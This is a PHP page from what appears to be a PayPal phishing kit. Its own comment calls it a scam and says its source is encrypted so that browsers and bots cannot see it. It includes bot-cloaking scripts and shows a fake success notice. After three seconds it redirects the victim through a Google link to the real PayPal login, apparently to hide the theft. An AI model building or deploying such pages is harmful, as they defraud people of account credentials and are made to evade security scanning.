<?php
//              ,▄▄▄
//            ▄██████,
//           ▐█████████Ç
//           ╙██████████W
//           ,,████████`
//       ▄▄████████▓╙╙▐█▓▓▄▄
//     ,██████████████▄▄╙█▓▀█▄,              ,▄▓╜
//    ▐██████████████████▓██▄▀█▄,          ,███▄
//     ▀██████████████████████▄██▌        ▄█████╛
//      ╙██████████████████████▌╙▀█╦,╓▄▄█w▐█▀▀'
//       '███████████████████████,╙███████
//        ▐█████████████████████████████▌,,,╓▄▄▄▄██████▄▄
//        ████████████████████████████████████████████████▄
//       '██████████████▌▐██████████████████████████████████▄
//        ╙▀▀▀███████████████████████████████████████████████▄
//              ▀███████████████████████████████████████████████▄
//               ▀██████████████████████████████▀▀███████▀████████▌╖      ▄██w
//                ╙████████████████████████▀▀╙    ▐██████▌ ▀█████████▄▄▄████▀
//                 '████████████████████▀▀        └███████,  ╙▀╙ ▀████████▀
//                       `"╙╙▀▀▀▀▀▀█▀▀▀            ███████▌        ████▌
//                        ▐█▌,    ▐█░   ╓▄██       ▐███████,        ╙▀
//                       ╒██████████████████▄       ███████▌
//                   ,,,,⌠▓▌▄████████████▄▄▓▄▄▄▄▄,  ▀████▀╙
//                  ████████████▀▀██▀▀████████████   ███▌
//                 ▄██"           ▓█            ▐██ ▐████▄,
//                  ▀╙            ▓█             ╙` ████████▄
//                                ▓█                ╙▀▀▀███████
//                                ▓█                      ╙╙╙`
//    ┌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
//
//
session_start();
# advanced html base64 encryptor (AES Cipher function: encrypt 'input' with Rijndael algorithm) changed every time so chrome & bots can't see the scam source code
require_once 'cherbot.php';
require_once 'language.php';
#------------------------
#For Bot
include("bots/checkbots.php");
bot::checkbot();
#------------------------
?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo $lang_59; ?></title>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<meta name="robots" content="noindex">
    <link rel="shortcut icon" type="image/x-icon" href="data:image/png;base64,AAABAAIAICAAAAEAIACoEAAAJgAAABAQAAABACAAaAQAAM4QAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD9/Pkc/vv1MP379TD9+/Uw/vv1MP39/Qr///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AMadPsHmoQD/3pwA/96cAP/oowD/xKNYp////wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AwaNco+mjAP/emwD/3psA/+OfAP/SnB7g+fn4Bv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A5OHgJMrFwjzMx8Q6zMfEOsvHxDq4m2Sb6aUA/96cAP/enAD/4J0A/9+fCPfl5OAe////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCucVDPhikA/4owAP+KMAD/hSoA/6RVAv3jogD/3pwA/96cAP/enAD/6aQA/9LMwD7///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////ALB+Y7mEKQD/hy8A/4cvAP+DKwD/mEYC/d+dAv3fnQD/3pwA/96cAP/tpgD/xLiaZP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AtpeGjoYqAP+GLwD/hi8A/4QtAP+NOQL92JUC/eCeAP/enAD/3pwA/+qlAP/CqWyT////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDDs6pkhioA/4YvAP+GLwD/hi4A/4YwAv3OigT64aAA/96cAP/enAD/4J0A/9ufEO7FrXSLxbGCfL+xkG7PyLZI6+roFf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////ANTNyj6FKQD/hy8A/4YvAP+GLwD/gioA/8J7BPrjogD/3pwA/96cAP/enAD/4J0A/+qkAP/rpQD/7KYA/+ulAP/eohTqxKlol+rp5hj///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A6ejnHIItCPeIMAD/hi8A/4YvAP+BKAD/tmsE+uSjAP/enAD/3pwA/96cAP/enAD/3pwA/96cAP/enAD/3pwA/+GeAP/tpwD/2aMi3eDe2Cb///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD6+fkGhkAi3YkwAP+GLwD/hi8A/4IpAP+kVQT66KcA/+akAP/lpAD/5aQA/+WkAP/kowD/4Z8A/9+dAP/enAD/3pwA/96cAP/opAD/06Iwz/f39gf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCNWkS7izAA/4YvAP+GLwD/hi8A/4MvAP+YUgP9ol0D/aFbA/2jXgX6q2YC/bp3Av3QjQL946EA/+OiAP/enAD/3pwA/96cAP/tpgD/xbeYZf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJp5bJONMgD/hi8A/4YvAP+HLwD/gy0A/2UaAf9hGAH/YhgB/2IYAf9iGAH/ZBoB/20kAf+LRAP9w4EC/eWjAP/fnQD/3pwA/+SgAP/JnjzC////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Ar52WZ44yAP+GLwD/hi8A/4YvAP+GLwD/biMB/2ggAf9pIAH/aSAB/2kgAf9pIAH/Zx4B/2IZAf9mHQH/qGQC/eSiAP/fnQD/35wA/9ucDvD9/PoV////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDGvrxCjTIA/4YvAP+GLwD/hi8A/4gwAP9yJQH/aB8B/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2ceAf9iGAH/r2sC/eWjAP/enAD/35wA//779TD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AOHf3h+JNAb4hzAA/4YvAP+GLwD/iDAA/3cnAf9nHwH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2YdAf9uJQH/0Y4A/+GfAP/gnAD//vv0Mv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A9/b2B4xGIN6JMAD/hi8A/4YvAP+IMAD/fCoA/2cfAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2EXAf+iXQL956QA/9yeEO79/PsS////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AkVxAv4swAP+GLwD/hi8A/4cwAP+ALAD/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/ZRsB/302Af/vqAD/xa9+gf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCcemiXjTIA/4YvAP+GLwD/hy8A/4QuAP9qIQH/Zx8B/2cfAf9nHwH/Zx8B/2cfAf9nHwH/Zx8B/2cfAf9nHgH/dSkB/76meIf9/fwB////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AK6bkG6OMgD/hi8A/4YvAP+GLwD/hy8A/3wqAP93JwD/dycA/3cnAP93JwD/dycA/3cnAP93JwD/eSgA/34rAP+ILwD/2NXUKv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Axr24Ro0yAP+GLwD/hi8A/4YvAP+GLwD/hzAA/4gwAP+IMAD/iDAA/4gwAP+IMAD/iDAA/4gwAP+IMAD/iDAA/4wxAP/Pysg1////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDe3NokiTME+ocvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+JMAD/iz0U6u/v7g////8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////APX19AqMQxzjiTAA/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hy8A/5IzAP+tlop0////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AIlONsmHKQD/gicA/4InAP+CJwD/gicA/4InAP+CJwD/gicA/4InAP+CJwD/gygA/4YpAP+FLgj3ooZ8g////wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Ay721WrR4WM2vdVfPr3VXz691V8+vdVfPr3VXz691V8+vdVfPr3VXz7R8X8W4jXaow62iceTh4Cb///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP//////////////////////4H///+B////gf//8AH///AB///wAP//+AB///gAA//4AAH/+AAA//gAAP/4AAB//AAAf/wAAH/8AAB//AAAf/wAAH/8AAD//gAB//4AAf/+AAH//gAD//4AA///AB///////////////////////KAAAABAAAAAgAAAAAQAgAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP7+/Qf+/foY/v36GP7+/gH///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDhz6ZZ4p4A/+GeAP/jzpxj////AP///wD///8A////AP///wD///8A////AP///wD///8A////ALiQfYuqe2KbqndKtOKfAP/enAD/37xqlP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCbWjrQhi8A/4o2Av3dmwL93pwA/9eqQr3///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AqHRcqIYvAP+ELQD91ZEC/d6cAP/dnAT616k+wdmxUq3jzZhl+fn4Bv///wD///8A////AP///wD///8A////ALuUg32HLwD/gysA/8mBAv3hoAD/4aAA/+CeAP/enAD/4p8A/9yxSrT9/fwB////AP///wD///8A////AP///wDKtaxTiTAA/4YvAP+AMQD9gToD/YQ9Av2WUQL9xYEC/eCeAP/jnwD/49W0Sv///wD///8A////AP///wD///8A3dbUKokwAP+GLwD/eykA/2gfAf9pIAH/aB8B/2YdAf+nYgL94J4A/+3MgI3///8A////AP///wD///8A////APX19AqJNwr1hi8A/4AsAP9oHwH/aSAB/2kgAf9pIAH/Zx4B/86LAP3tzH+M////AP///wD///8A////AP///wD///8AkU4q1YYvAP+ELgD/aCAB/2gfAf9oHwH/aB8B/2ceAf+nah7g8OreH////wD///8A////AP///wD///8A////AKNuUqyGLwD/hi8A/4AsAP9/KwD/fysA/38rAP+BLAD/r4Bol////wD///8A////AP///wD///8A////AP///wC6kXyDhy8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/ijAA/8mwolr///8A////AP///wD///8A////AP///wD///8A1cK6SJpOK+WYTivnmE4r55hOK+eZTyzjoGJFxsKkmGf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD//wAA//8AAPz/AADgfwAA4H8AAOAfAADwBwAA8AcAAPADAADwAwAA8AcAAPAHAADwDwAA+B8AAP//AAD//wAA"/>
    <link rel="stylesheet" type="text/css" href="css/app.css">
</head>
<body>
<div class="main " role="main" id="main">
    <section class="login" id="login">
        <div class="corral" >
            <div class="contentContainer">
                <header>
                    <div class="notifications" id="notifications" tabindex="-1">

                        <p align="center">

                        <img border="0" src="css/shared/ok-xxxl.png" width="152" height="154"></p>
						<p class="notification notification-success " role="alert" ><?php echo $lang_60; ?>
                            </p>
						<p class=" " role="alert" >
                            <br/>
                            <?php echo $lang_61; ?><br/>

                            <?php echo $lang_62; ?>
                        </p>
						<p class=" " role="alert" >
                            <img border="0" src="css/shared/ptcs.png"></p>
                    </div>
                </header>
            </div>
        </div>
    </section>
    <script>
        setTimeout(function () {
            window.location.assign("https://www.google.com//url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwj-05aap87ZAhVNrRQKHY__D14QFggqMAA&url=https%3A%2F%2Fwww.paypal.com%2Flogin&usg=AOvVaw2rhcqTm8PhbE_cGF9o8paq");
        },3000)
    </script>
</div>
</body>
</html>